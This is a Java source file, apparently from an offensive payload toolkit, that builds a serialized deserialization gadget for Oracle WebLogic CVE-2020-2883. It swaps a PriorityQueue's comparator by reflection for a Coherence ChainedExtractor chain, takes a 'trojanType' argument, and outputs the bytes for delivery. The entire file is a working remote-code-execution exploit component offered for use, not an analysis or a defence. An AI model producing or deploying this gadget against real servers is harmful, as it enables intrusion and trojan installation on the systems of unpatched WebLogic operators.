package core.payloads;

import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import core.enumtypes.PayloadType;
import core.utils.Util;
import utils.weblogic.WeblogicGadget;

import javax.script.ScriptEngineManager;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class Weblogic_CVE_2020_2883 {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        ReflectionExtractor[] extractors = WeblogicGadget.getReflectionExtractor(type, trojanType);
        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        ExtractorComparator extractorComparator = new ExtractorComparator(chainedExtractor);

        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add("1");
        priorityQueue.add("1");
        Field field = priorityQueue.getClass().getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, extractorComparator);

        Field field2 = priorityQueue.getClass().getDeclaredField("queue");
        field2.setAccessible(true);
        Object[] queuearray = (Object[]) field2.get(priorityQueue);
//        queuearray[0] = ScriptEngineManager.class;
        queuearray[1] = Integer.class;
        queuearray[0] = ScriptEngineManager.class;

        return priorityQueue;
    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        Object priorityQueue = getObject(type, trojanType);
        return Util.serialize(priorityQueue);
    }
}
